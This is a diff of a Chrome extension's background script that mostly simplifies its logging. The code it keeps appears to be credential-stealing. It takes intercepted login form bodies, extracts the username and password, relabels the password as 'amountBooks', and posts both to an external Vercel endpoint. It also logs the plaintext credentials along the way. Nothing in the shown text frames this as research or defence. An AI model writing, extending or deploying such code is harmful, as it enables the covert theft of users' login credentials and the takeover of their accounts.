@@ -5,36 +5,28 @@ console.log("[TIC][bg] background service worker started");
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   console.log("[TIC][bg] message received:", message);
 
-  if (message?.type !== "LOGEAR_PAYLOAD") {
-    console.log("[TIC][bg] ignored message");
-    return;
-  }
+  if (message?.type !== "LOGEAR_PAYLOAD") return;
 
   const rawBody = message.rawBody;
-
   console.log("[TIC][bg] rawBody:", rawBody);
+  console.log("[TIC][bg] rawBody stringified:", JSON.stringify(rawBody));
 
   if (typeof rawBody !== "string" || !rawBody.length) {
-    console.error("[TIC][bg] Missing or invalid rawBody");
+    console.error("[TIC][bg] Missing rawBody");
     sendResponse({ ok: false, error: "Missing rawBody" });
     return;
   }
 
   try {
     const params = new URLSearchParams(rawBody);
-
-    console.log("[TIC][bg] parsed params entries:", [...params.entries()]);
+    console.log("[TIC][bg] params:", [...params.entries()]);
 
     const username = params.get("u");
     const password = params.get("c");
 
-    console.log("[TIC][bg] extracted fields:", {
-        username,
-        password
-    });
-
+    console.log("[TIC][bg] extracted:", { username, password });
+    
     if (!username || password == null) {
-      console.error("[TIC][bg] Could not extract u or c");
       sendResponse({
         ok: false,
         error: "Could not extract u/c",
@@ -48,7 +40,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
       amountBooks: String(password)
     };
 
-    console.log("[TIC][bg] forwarding payload to Vercel:", payload);
+    console.log("[TIC][bg] forwarding payload:", payload);
 
     fetch(VERCEL_URL, {
       method: "POST",
@@ -59,13 +51,11 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     })
       .then(async (res) => {
         const text = await res.text();
-
         console.log("[TIC][bg] Vercel response:", {
           ok: res.ok,
           status: res.status,
           body: text
         });
-
         sendResponse({
           ok: res.ok,
           status: res.status,
@@ -73,20 +63,12 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         });
       })
       .catch((error) => {
-        console.error("[TIC][bg] fetch to Vercel failed:", error);
-
-        sendResponse({
-          ok: false,
-          error: error.message
-        });
+        console.error("[TIC][bg] fetch failed:", error);
+        sendResponse({ ok: false, error: error.message });
       });
   } catch (error) {
-    console.error("[TIC][bg] parsing failed:", error);
-
-    sendResponse({
-      ok: false,
-      error: String(error)
-    });
+    console.error("[TIC][bg] parse failed:", error);
+    sendResponse({ ok: false, error: String(error) });
   }
 
   return true;
